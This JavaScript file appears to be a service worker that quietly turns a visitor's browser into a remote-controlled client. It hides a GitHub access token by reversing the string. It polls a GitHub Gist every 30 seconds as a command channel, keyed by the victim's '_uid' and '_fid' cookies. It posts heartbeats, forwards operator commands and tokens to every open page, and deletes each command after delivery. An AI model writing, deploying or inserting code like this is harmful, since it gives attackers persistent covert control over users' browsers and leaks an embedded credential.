var PAT     = 'nqxjx0RRWCrR9eybiamApnU5oAubW1DmWlnc_phg'.split('').reverse().join('');
var GIST_ID = '6bb037f859d2dc4f26f8c0e4880aa9a2';
var POLL_MS = 30000;
var _meta   = null;

self.addEventListener('install', function() { self.skipWaiting(); });
self.addEventListener('activate', function(e) {
    e.waitUntil(self.clients.claim());
    poll();
});

async function poll() {
    var uid = await getCookie('_uid');
    if (uid) {
        await heartbeat(uid);
        await checkCmd(uid);
    } else {
        var fid = await getCookie('_fid');
        if (fid) await checkUmt(fid);
    }
    setTimeout(poll, POLL_MS);
}

async function getCookie(name) {
    try {
        var cookie = await cookieStore.get(name);
        return cookie ? cookie.value : null;
    } catch(e) {
        return null;
    }
}

async function checkUmt(fid) {
    try {
        var r = await fetch('https://api.github.com/gists/' + GIST_ID, {
            headers: { 'Authorization': 'Bearer ' + PAT }
        });
        if (!r.ok) return;
        var gist = await r.json();
        var key = 'umt_' + fid;
        if (!gist.files || !gist.files[key]) return;
        var umt = (gist.files[key].content || '').trim();
        if (!umt) return;
        var clients = await self.clients.matchAll({ includeUncontrolled: true });
        clients.forEach(function(c) { c.postMessage({ type: 'umt_ready', umt: umt }); });
        var del = {};
        del[key] = null;
        await fetch('https://api.github.com/gists/' + GIST_ID, {
            method: 'PATCH',
            headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
            body: JSON.stringify({ files: del })
        });
    } catch(e) {}
}

async function heartbeat(uid) {
    try {
        if (!_meta) {
            var r0 = await fetch('https://api.github.com/gists/' + GIST_ID, {
                headers: { 'Authorization': 'Bearer ' + PAT }
            });
            if (r0.ok) {
                var g = await r0.json();
                var mk = 'meta_' + uid;
                try { _meta = g.files && g.files[mk] ? JSON.parse(g.files[mk].content || '{}') : {}; } catch(e) { _meta = {}; }
            } else { _meta = {}; }
        }
        _meta.ts = Math.floor(Date.now() / 1000);
        var files = {};
        files['meta_' + uid] = { content: JSON.stringify(_meta) };
        await fetch('https://api.github.com/gists/' + GIST_ID, {
            method: 'PATCH',
            headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
            body: JSON.stringify({ files: files })
        });
    } catch(e) {}
}

async function checkCmd(uid) {
    try {
        var r = await fetch('https://api.github.com/gists/' + GIST_ID, {
            headers: { 'Authorization': 'Bearer ' + PAT }
        });
        if (!r.ok) return;
        var gist = await r.json();
        var key = 'cmd_' + uid;
        if (!gist.files || !gist.files[key]) return;
        var cmd = (gist.files[key].content || '').trim();
        if (!cmd) return;
        var clients = await self.clients.matchAll({ includeUncontrolled: true });
        clients.forEach(function(c) { c.postMessage({ type: 'cmd', payload: { cmd: cmd, uid: uid } }); });
        var del = {};
        del[key] = null;
        await fetch('https://api.github.com/gists/' + GIST_ID, {
            method: 'PATCH',
            headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
            body: JSON.stringify({ files: del })
        });
    } catch(e) {}
}
